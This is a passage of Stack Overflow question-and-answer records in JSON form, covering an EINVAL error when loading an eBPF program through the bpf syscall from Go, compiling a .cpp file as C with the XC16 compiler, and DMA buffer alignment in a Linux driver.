"https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518037578, "post_id": 48673140, "comment_id": 84344840, "body": "Does it work if you add <code>SEC(&quot;kprobe&#47;__set_task_comm&quot;)</code> back?"}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "reply_to_user": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518037830, "post_id": 48673140, "comment_id": 84344974, "body": "I had to add <code>#include &quot;bpf_helpers.h&quot;</code> but no it still doesn&#39;t work, with the same error :/"}, {"owner": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518038127, "post_id": 48673140, "comment_id": 84345100, "body": "Ok. You had no warning during compilation? It should complain about the missing <code>#include &lt;linux&#47;ptrace.h&gt;</code> for <code>struct pt_regs</code> AFAIK."}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "reply_to_user": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518038274, "post_id": 48673140, "comment_id": 84345177, "body": "Yeah I had a warning, but it still compiled without an error. I added back <code>#include &lt;linux&#47;ptrace.h&gt;</code> and it compiled without warnings or errors but I received the same error from the <code>bpf</code> syscall"}, {"owner": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518038879, "post_id": 48673140, "comment_id": 84345499, "body": "Ok. What about the two last lines you removed, about the version and the license? Have you tried with those?"}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "reply_to_user": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518039281, "post_id": 48673140, "comment_id": 84345698, "body": "nah same error still :/ I had to add <code>#include &lt;linux&#47;version.h&gt;</code>"}, {"owner": {"reputation": 4454, "user_id": 3716552, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/078Ob.jpg?s=128&g=1", "display_name": "Qeole", "link": "https://stackoverflow.com/users/3716552/qeole"}, "edited": false, "score": 0, "creation_date": 1518045658, "post_id": 48673140, "comment_id": 84348398, "body": "What code are you using to load and attach your program? Do you get any output from the kernel verifier? Have you tried providing a non-null <code>log-level</code> to <code>bpf()</code>? (The latter should not be needed if I remember correctly, verifier should print error messages anyway if the problem occurs at this stage\u2026 but just in case.)"}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "edited": false, "score": 0, "creation_date": 1518046281, "post_id": 48673140, "comment_id": 84348624, "body": "I&#39;ve tried providing a log_level buffer but it never gets filled - it may be an issue with the way I&#39;m doing it. The code I&#39;m using to load the program is the same as the following question: <a href=\"https://stackoverflow.com/questions/48653164/argument-list-too-long-to-when-loading-an-ebpf-program-via-the-bpf-syscall?noredirect=1#comment84339960_48653164\" title=\"argument list too long to when loading an ebpf program via the bpf syscall\">stackoverflow.com/questions/48653164/&hellip;</a>"}, {"owner": {"reputation": 4454, "user_id": 3716552, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/078Ob.jpg?s=128&g=1", "display_name": "Qeole", "link": "https://stackoverflow.com/users/3716552/qeole"}, "edited": false, "score": 0, "creation_date": 1518049827, "post_id": 48673140, "comment_id": 84349644, "body": "So you tried a non-empty buffer and provided its length to <code>bpf()</code>, along with a non-null <code>log-level</code>, right? And you get nothing in this buffer after <code>bpf()</code> returns? Since last question, did you manage to fix your loader to get the correct eBPF bytecode instructions to feed to <code>bpf()</code>, by the way?"}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "reply_to_user": {"reputation": 4454, "user_id": 3716552, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/078Ob.jpg?s=128&g=1", "display_name": "Qeole", "link": "https://stackoverflow.com/users/3716552/qeole"}, "edited": false, "score": 0, "creation_date": 1518082127, "post_id": 48673140, "comment_id": 84360881, "body": "@Qeole Yeah, with log-level=1, and the buffer contains the same characters as what I initialised it with :/ Haven&#39;t managed to get <code>bpf</code> to return successfully yet. I did add the <code>kern_version</code> parameter, which is only checked when the program type is <code>kprobe</code> (which it is in my case) and I got <code>EPERM</code> so had start running my program with <code>sudo</code> (<code>CAP_SYS_ADMIN</code> is required as expected) - so the <code>EINVAL</code> errors I was getting previously may have been due to the <code>kern_version</code> being set to 0, hard to tell. The error went back to being <code>EINVAL</code> again when using <code>sudo</code>"}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "reply_to_user": {"reputation": 4454, "user_id": 3716552, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/078Ob.jpg?s=128&g=1", "display_name": "Qeole", "link": "https://stackoverflow.com/users/3716552/qeole"}, "edited": false, "score": 0, "creation_date": 1518082213, "post_id": 48673140, "comment_id": 84360949, "body": "@Qeole anyway, my current plan is to understand and modify <a href=\"https://github.com/weaveworks/tcptracer-bpf\" rel=\"nofollow noreferrer\">tcptracer-bpf</a> which seems to be doing something very close to what I want"}, {"owner": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518083222, "post_id": 48673140, "comment_id": 84361650, "body": "@dippynark Could you add your userspace code, with the call to the bpf syscall?"}, {"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 0, "creation_date": 1518116887, "post_id": 48673140, "comment_id": 84384377, "body": "Are you sure you have a BPF C compiler available, and that you&#39;re using it to compile that program? BPF programs aren&#39;t native executables."}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "reply_to_user": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "edited": false, "score": 0, "creation_date": 1518117081, "post_id": 48673140, "comment_id": 84384492, "body": "@pchaigno sorry for the late reply - I&#39;ve added my full userspace code to the bottom of the question. I&#39;ve left the comments in as it might be useful to what I&#39;ve tried. As Qeole mentioned <a href=\"https://stackoverflow.com/questions/48653164/argument-list-too-long-to-when-loading-an-ebpf-program-via-the-bpf-syscall?noredirect=1#answer-48661976\">here</a> it may be the case that I&#39;m passing in a load of ELF headers which the kernel doesn&#39;t like, still need to look into that"}, {"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "reply_to_user": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 0, "creation_date": 1518117141, "post_id": 48673140, "comment_id": 84384520, "body": "@duskwuff yeah, I&#39;m compiling the BPF program with the <code>Makefile</code> linked"}], "answers": [{"comments": [{"owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "edited": false, "score": 0, "creation_date": 1518386988, "post_id": 48724423, "comment_id": 84473514, "body": "started using <a href=\"https://github.com/iovisor/gobpf\" rel=\"nofollow noreferrer\">gobpf&#39;s</a> elf package to load the program and it now works, thanks for the explanation though - changed the chosen answer for my other question to Qeole&#39;s answer too :)"}], "tags": [], "owner": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b0b52ad2211a26c4e1cefb472e09cbe?s=128&d=identicon&r=PG", "display_name": "pchaigno", "link": "https://stackoverflow.com/users/6884590/pchaigno"}, "is_accepted": true, "score": 1, "last_activity_date": 1518426630, "last_edit_date": 1518426630, "creation_date": 1518288847, "answer_id": 48724423, "question_id": 48673140, "link": "https://stackoverflow.com/questions/48673140/invalid-argument-einval-when-trying-to-load-a-bpf-program/48724423#48724423", "title": "Invalid argument (EINVAL) when trying to load a BPF program", "body": "<p>As <a href=\"https://stackoverflow.com/a/48661976/6884590\">Qeole pointed out in your previous question</a>, your userspace Go program needs to extract the BPF instructions (<code>.text</code> section) from the object file. Otherwise, the kernel will try to interpret the binary content as BPF instructions and inevitably fail.</p>\n"}], "owner": {"reputation": 2018, "user_id": 6180803, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/x8pJW.jpg?s=128&g=1", "display_name": "dippynark", "link": "https://stackoverflow.com/users/6180803/dippynark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1051, "favorite_count": 0, "accepted_answer_id": 48724423, "answer_count": 1, "score": 1, "last_activity_date": 1576143953, "creation_date": 1518037205, "last_edit_date": 1576143953, "question_id": 48673140, "link": "https://stackoverflow.com/questions/48673140/invalid-argument-einval-when-trying-to-load-a-bpf-program", "title": "Invalid argument (EINVAL) when trying to load a BPF program", "body": "<p>I am trying to load a BPF program using the <code>bpf</code> syscall but I am receiving <code>invalid argument</code> (EINVAL) on return. From the <a href=\"http://man7.org/linux/man-pages/man2/bpf.2.html#ERRORS\" rel=\"nofollow noreferrer\">man page</a>, the possible reasons for this are:</p>\n\n<pre><code>EINVAL\n\nFor BPF_PROG_LOAD, indicates an attempt to load an invalid program. \neBPF programs can be deemed invalid due to unrecognized instructions, \nthe use of reserved fields, jumps out of range, infinite loops or calls \nof unknown functions.\n</code></pre>\n\n<p>So it seems there is something wrong with my BPF program. My BPF program is as follows:</p>\n\n<pre><code>#include &lt;uapi/linux/bpf.h&gt;\n\nint prog(struct pt_regs *ctx)\n{\n    return 0;\n}\n</code></pre>\n\n<p>Which surely cannot have anything wrong with it. </p>\n\n<p>I am compiling with the <code>Makefile</code> <a href=\"https://github.com/torvalds/linux/blob/master/samples/bpf/Makefile\" rel=\"nofollow noreferrer\">here</a> (I removed most of the code from <code>test_overhead_kprobe_kern.c</code> to give a very simple program for testing).</p>\n\n<p>What could be wrong with my program that caused it to get rejected?</p>\n\n<p><code>uname -a</code>: Linux ubuntu1710 4.13.0-32-generic #35-Ubuntu SMP Thu Jan 25 09:13:46 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</p>\n\n<p>My full userspace code (in Go) is as follows:</p>\n\n<pre><code>package main\n\n/*\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid print(char* s) {\n printf(\"%s\\n\", s);\n}\n*/\nimport \"C\"\n\nimport (\n    \"unsafe\"\n\n    \"golang.org/x/sys/unix\"\n\n    \"github.com/cilium/cilium/pkg/bpf\"\n)\nimport (\n    \"fmt\"\n    \"io/ioutil\"\n)\n\nconst (\n    bufferSize           = 256\n    sessionIDHTTPHeader  = \"X-Session-ID\"\n    defaultServerAddress = \"localhost\"\n    defaultPort          = 5050\n)\n\nconst (\n    BPF_PROG_TYPE_UNSPEC        = 0\n    BPF_PROG_TYPE_SOCKET_FILTER = 1\n    BPF_PROG_TYPE_KPROBE        = 2\n    BPF_PROG_TYPE_SCHED_CLS     = 3\n    BPF_PROG_TYPE_SCHED_ACT     = 4\n)\n\ntype ttyWrite struct {\n    Count     int32\n    Buf       [bufferSize]byte\n    SessionID int32\n}\n\nfunc main() { \n\n  //for i := 0; i &lt; 6; i++ {\n    //b, err := ioutil.ReadFile(fmt.Sprintf(\"bpf/test%d.o\", i))\n    b, err := ioutil.ReadFile(\"bpf/bpf_tty.o\")\n    if err != nil {\n        fmt.Print(err)\n    }\n\n    err = loadProgram(BPF_PROG_TYPE_KPROBE, unsafe.Pointer(&amp;b), len(b))\n    if err != nil {\n        fmt.Printf(\"%s\\n\", err)\n    }\n    //}\n\n}\n\nfunc loadProgram(progType int, insns unsafe.Pointer, insnCnt int) error {\n\n    licenseBuf := \"GPL\"\n    licenseStr := C.CString(licenseBuf)\n    defer C.free(unsafe.Pointer(licenseStr))\n\n    logStr := C.CString(\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\")\n    defer C.free(unsafe.Pointer(logStr))\n\n    lba := struct {\n        progType uint32\n        //pad0        [4]byte\n        insnCnt uint32\n        //pad1        [4]byte\n        insns    uint64\n        license  uint64\n        logLevel uint32\n        //pad2        [4]byte\n        logSize uint32\n        //pad3    [4]byte\n        logBuf  uint64\n        kernVersion uint32\n        //pad4        [4]byte\n    }{\n        progType: uint32(progType),     \n        insnCnt:  uint32(insnCnt),\n        insns:    uint64(uintptr(insns)),\n        license:  uint64(uintptr(unsafe.Pointer(licenseStr))),      \n        logLevel: uint32(1),\n        logSize:  uint32(50),\n        logBuf:   uint64(uintptr(unsafe.Pointer(logStr))),\n        //logBuf: uint64(uintptr(unsafe.Pointer(bufStr))),\n        // /usr/src/linux-headers-4.13.0-32-generic/include/generated/uapi/linux/version.h\n        kernVersion: uint32(265485),\n    }\n\n    ret, _, err := unix.Syscall(\n        unix.SYS_BPF,\n        bpf.BPF_PROG_LOAD,\n        uintptr(unsafe.Pointer(&amp;lba)),\n        unsafe.Sizeof(lba),\n    )\n\n    //fmt.Printf(\"%s\\n\", logBuf)\n    //cs := C.CString(\"XXXXXXXXXX\")\n    C.print(logStr)\n    //fmt.Printf(\"%c\\n\", *logStr)\n\n    if ret != 0 || err != 0 {\n        //fmt.Printf(\"%#v %d\\n\", logBuf, unsafe.Sizeof(lba))\n        return fmt.Errorf(\"Unable to load program: ret: %d: %s\", int(ret), err)\n    }\n\n    return nil\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "xc16"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2672107"}, "edited": false, "score": 5, "creation_date": 1518037352, "post_id": 48672996, "comment_id": 84344695, "body": "Why don\u2019t you compile it as C on MSVC?"}, {"owner": {"reputation": 2449, "user_id": 500276, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/200bf76976f24add540182f5c3a42788?s=128&d=identicon&r=PG&f=1", "display_name": "Mark Benningfield", "link": "https://stackoverflow.com/users/500276/mark-benningfield"}, "edited": false, "score": 0, "creation_date": 1518049216, "post_id": 48672996, "comment_id": 84349466, "body": "How are you building for Windows? VisualStudio?, MSBuild?"}, {"owner": {"reputation": 657, "user_id": 3401601, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/NkaeT.jpg?s=128&g=1", "display_name": "EBlake", "link": "https://stackoverflow.com/users/3401601/eblake"}, "edited": false, "score": 0, "creation_date": 1518049787, "post_id": 48672996, "comment_id": 84349629, "body": "In the Windows environment, the code is encapsulated in a class (so it needs to be built with C++). This is not possible when compiled as C with a 16-bit microprocessor target."}, {"owner": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 1, "creation_date": 1518049932, "post_id": 48672996, "comment_id": 84349676, "body": "Don&#39;t know about XC16, but MSVC has options to build as C or C++ with any extension. <a href=\"https://msdn.microsoft.com/en-us/library/032xwy55.aspx\" rel=\"nofollow noreferrer\">Specify Source File Type</a>"}, {"owner": {"reputation": 657, "user_id": 3401601, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/NkaeT.jpg?s=128&g=1", "display_name": "EBlake", "link": "https://stackoverflow.com/users/3401601/eblake"}, "reply_to_user": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 0, "creation_date": 1518050253, "post_id": 48672996, "comment_id": 84349762, "body": "@BoPersson Thanks. We found a similar solution (see my answer). Unfortunately this does not seem to be an option for XC16. More specifically, I think the problem lies with MPLABX, which dynamically builds the makefile."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1518050919, "post_id": 48672996, "comment_id": 84349949, "body": "You should compile C code as C in both cases; in the C++ app you could have a wrapper that wraps the C code without requiring modification of the C code"}], "answers": [{"tags": [], "owner": {"reputation": 657, "user_id": 3401601, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/NkaeT.jpg?s=128&g=1", "display_name": "EBlake", "link": "https://stackoverflow.com/users/3401601/eblake"}, "is_accepted": true, "score": 0, "last_activity_date": 1518050430, "last_edit_date": 1518050430, "creation_date": 1518050097, "answer_id": 48675632, "question_id": 48672996, "link": "https://stackoverflow.com/questions/48672996/building-foo-cpp-as-c-code-with-microchip-xc16-compiler/48675632#48675632", "title": "Building foo.cpp as C code with Microchip XC16 compiler", "body": "<p>We discovered a flag in one of our Windows build environments (Embarcadero CBuilder) that forces compiling <code>foo.c</code> as C++. We'll therefore rename to <code>foo.c</code>. Problem solved. (EDIT: Others have commented that similar flags exist in VC)</p>\n\n<p>We could not find a comparable flag in XC16 (based on gcc 4.5.1) to treat <code>foo.cpp</code> as a C source file. The -x flag (<a href=\"https://stackoverflow.com/questions/4216247/forcing-gcc-to-compile-cpp-file-as-c\">Forcing gcc to compile .cpp file as C</a>) does not seem to work under MPLABX.</p>\n"}], "owner": {"reputation": 657, "user_id": 3401601, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/NkaeT.jpg?s=128&g=1", "display_name": "EBlake", "link": "https://stackoverflow.com/users/3401601/eblake"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 209, "favorite_count": 0, "accepted_answer_id": 48675632, "answer_count": 1, "score": 0, "last_activity_date": 1518050430, "creation_date": 1518036615, "question_id": 48672996, "link": "https://stackoverflow.com/questions/48672996/building-foo-cpp-as-c-code-with-microchip-xc16-compiler", "title": "Building foo.cpp as C code with Microchip XC16 compiler", "body": "<p>I have some code that is shared between a C++ Windows application and an XC16 C application. The source is written in such a way that it compiles cleanly under MSVC and XC16 (with appropriate use of the <code>__cplusplus</code> macro).</p>\n\n<p>The problem is that XC16 refuses to build <code>foo.cpp</code>. I have to copy the file to <code>foo.c</code> and back again. This is wreaking havoc on revision control, and making code edits within the ide problematic when the copying functions are automated in the build process.</p>\n\n<p>Is there a way to get XC16 to build (as C) a file with the extension cpp? (note that the header file is <code>foo.h</code>, so it is not an issue).</p>\n"}, {"tags": ["c", "linux", "memory-management", "xilinx", "dma"], "answers": [{"comments": [{"owner": {"reputation": 255, "user_id": 8825833, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/51b901da80f75bacf5bf0b6eb7ead307?s=128&d=identicon&r=PG&f=1", "display_name": "John Frye", "link": "https://stackoverflow.com/users/8825833/john-frye"}, "edited": false, "score": 0, "creation_date": 1518040886, "post_id": 48673930, "comment_id": 84346419, "body": "the real question is: does it need to start at the beginning of the page frame for DMA transactions to take place. Whether the buffers do or not is trivial until that is established"}, {"owner": {"reputation": 558, "user_id": 4207183, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-FlaU_rcEFmQ/AAAAAAAAAAI/AAAAAAAAF-Y/UVEWfvV4tKE/photo.jpg?sz=128", "display_name": "Alejandro Visiedo Garc&#237;a", "link": "https://stackoverflow.com/users/4207183/alejandro-visiedo-garc%c3%ada"}, "reply_to_user": {"reputation": 255, "user_id": 8825833, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/51b901da80f75bacf5bf0b6eb7ead307?s=128&d=identicon&r=PG&f=1", "display_name": "John Frye", "link": "https://stackoverflow.com/users/8825833/john-frye"}, "edited": false, "score": 0, "creation_date": 1518041634, "post_id": 48673930, "comment_id": 84346759, "body": "By the information into this link (<a href=\"https://www.kernel.org/doc/Documentation/DMA-API-HOWTO.txt\" rel=\"nofollow noreferrer\">kernel.org/doc/Documentation/DMA-API-HOWTO.txt</a>), the memory for the DMA should be aligned with the cache-line, to avoid data corruption, so that, you don&#39;t need memory aligned with the beginning of a frame page, but yes with the cache-line. In a core i7, it is 64 bytes."}, {"owner": {"reputation": 558, "user_id": 4207183, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-FlaU_rcEFmQ/AAAAAAAAAAI/AAAAAAAAF-Y/UVEWfvV4tKE/photo.jpg?sz=128", "display_name": "Alejandro Visiedo Garc&#237;a", "link": "https://stackoverflow.com/users/4207183/alejandro-visiedo-garc%c3%ada"}, "reply_to_user": {"reputation": 255, "user_id": 8825833, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/51b901da80f75bacf5bf0b6eb7ead307?s=128&d=identicon&r=PG&f=1", "display_name": "John Frye", "link": "https://stackoverflow.com/users/8825833/john-frye"}, "edited": false, "score": 0, "creation_date": 1518042241, "post_id": 48673930, "comment_id": 84347041, "body": "I have just read the manual for kmalloc, based into the above information, if you use kmalloc with the flag GFP_DMA, the returned address should be suitable for DMA transactions, so that, in such scenario, the returned address is aligned with cacheline-size that is the only thing to consider based into the information above."}, {"owner": {"reputation": 255, "user_id": 8825833, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/51b901da80f75bacf5bf0b6eb7ead307?s=128&d=identicon&r=PG&f=1", "display_name": "John Frye", "link": "https://stackoverflow.com/users/8825833/john-frye"}, "edited": false, "score": 0, "creation_date": 1518043075, "post_id": 48673930, "comment_id": 84347419, "body": "I read that too. I just wonder why Xilinx saw the need to do what appears to be page alignment in their driver. It looks like they use kmalloc to initialize their source and destination buffers, but then they adjust the pointers. All software I have written uses GFP_KERNEL for allocation. It looks like I had a scatter gather DMA port on the Xilinx AXI DMA core that might be affecting things. I have removed it and am rebuilding the software"}], "tags": [], "owner": {"reputation": 558, "user_id": 4207183, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-FlaU_rcEFmQ/AAAAAAAAAAI/AAAAAAAAF-Y/UVEWfvV4tKE/photo.jpg?sz=128", "display_name": "Alejandro Visiedo Garc&#237;a", "link": "https://stackoverflow.com/users/4207183/alejandro-visiedo-garc%c3%ada"}, "is_accepted": true, "score": 1, "last_activity_date": 1518042572, "last_edit_date": 1518042572, "creation_date": 1518040552, "answer_id": 48673930, "question_id": 48672908, "link": "https://stackoverflow.com/questions/48672908/dma-engine-timeout-and-dma-memory-mapping/48673930#48673930", "title": "DMA Engine Timeout and DMA Memory Mapping", "body": "<p>Having a look to <a href=\"https://stackoverflow.com/questions/44255742/kmalloc-alignment\">this link</a> seems that you don't have any guarantee that your memory allocation will start at the beginning of a frame page. However, <a href=\"https://www.kernel.org/doc/gorman/html/understand/understand009.html\" rel=\"nofollow noreferrer\">this other link</a> can be helpful, where it is explained alloc_pages, that maybe fit better with what you need.</p>\n\n<p>In regarding with the alignment of the memory to be used in DMA transactions, into <a href=\"https://www.kernel.org/doc/Documentation/DMA-API-HOWTO.txt\" rel=\"nofollow noreferrer\">this link</a> we can read the following:</p>\n\n<blockquote>\n  <h1>What memory is DMA'able?</h1>\n  \n  <p>The first piece of information you must know is what kernel memory can\n  be used with the DMA mapping facilities.  There has been an unwritten\n  set of rules regarding this, and this text is an attempt to finally\n  write them down.</p>\n  \n  <p>If you acquired your memory via the page allocator\n  (i.e. __get_free_page*()) or the generic memory allocators\n  (i.e. kmalloc() or kmem_cache_alloc()) then you may DMA to/from\n  that memory using the addresses returned from those routines.</p>\n  \n  <p>This means specifically that you may <em>not</em> use the memory/addresses\n  returned from vmalloc() for DMA.  It is possible to DMA to the\n  <em>underlying</em> memory mapped into a vmalloc() area, but this requires\n  walking page tables to get the physical addresses, and then\n  translating each of those pages back to a kernel address using\n  something like __va().  [ EDIT: Update this when we integrate\n  Gerd Knorr's generic code which does this. ]</p>\n  \n  <p>This rule also means that you may use neither kernel image addresses\n  (items in data/text/bss segments), nor module image addresses, nor\n  stack addresses for DMA.  These could all be mapped somewhere entirely\n  different than the rest of physical memory.  Even if those classes of\n  memory could physically work with DMA, you'd need to ensure the I/O\n  buffers were cacheline-aligned.  Without that, you'd see cacheline\n  sharing problems (data corruption) on CPUs with DMA-incoherent caches.\n  (The CPU could write to one word, DMA would write to a different one\n  in the same cache line, and one of them could be overwritten.)</p>\n  \n  <p>Also, this means that you cannot take the return of a kmap()\n  call and DMA to/from that.  This is similar to vmalloc().</p>\n  \n  <p>What about block I/O and networking buffers?  The block I/O and\n  networking subsystems make sure that the buffers they use are valid\n  for you to DMA from/to.</p>\n</blockquote>\n\n<p>So that, only we need the address to be aligned with cacheline-size, and we don't need to get memory aligned to frame page (it would work too, but it is not needed). In regarding with the <a href=\"https://www.kernel.org/doc/htmldocs/kernel-api/API-kmalloc.html\" rel=\"nofollow noreferrer\">manual about kmalloc</a>, if we specify the flag GFP_DMA we get memory suitable for DMA transactions (aligned to cacheline-size).</p>\n"}], "owner": {"reputation": 255, "user_id": 8825833, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/51b901da80f75bacf5bf0b6eb7ead307?s=128&d=identicon&r=PG&f=1", "display_name": "John Frye", "link": "https://stackoverflow.com/users/8825833/john-frye"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 732, "favorite_count": 1, "accepted_answer_id": 48673930, "answer_count": 1, "score": 1, "last_activity_date": 1518042572, "creation_date": 1518036190, "question_id": 48672908, "link": "https://stackoverflow.com/questions/48672908/dma-engine-timeout-and-dma-memory-mapping", "title": "DMA Engine Timeout and DMA Memory Mapping", "body": "<p>I am trying to use a Linux DMA driver. Currently, when I send the transaction out and begin waiting, my request times out. I believe this has to do with the way I am setting up my buffers when I am performing DMA Mapping. </p>\n\n<pre><code>char *src_dma_buffer = kmalloc(dma_length, GFP_KERNEL);\nchar *dest_dma_buffer = kzalloc(dma_length, GFP_KERNEL);\n\ntx_dma_handle = dma_map_single(tx_chan-&gt;device-&gt;dev, src_dma_buffer, dma_length, DMA_TO_DEVICE);    \nrx_dma_handle = dma_map_single(rx_chan-&gt;device-&gt;dev, dest_dma_buffer, dma_length, DMA_FROM_DEVICE);\n</code></pre>\n\n<p>In Xilinx's DMA driver, they take special care to look at memory alignment. In particular, they use a property of the dma_chan->dma_device called copy_align.</p>\n\n<blockquote>\n  <ul>\n  <li>@copy_align: alignment shift for memcpy operations</li>\n  </ul>\n</blockquote>\n\n<pre><code>const int dma_length = 16*1024;\nlen = dmatest_random() % test_buf_size + 1;\nlen = (len &gt;&gt; align) &lt;&lt; align;\nif (!len)\n    len = 1 &lt;&lt; align;\nsrc_off = dmatest_random() % (test_buf_size - len + 1);\ndst_off = dmatest_random() % (test_buf_size - len + 1);\n\nsrc_off = 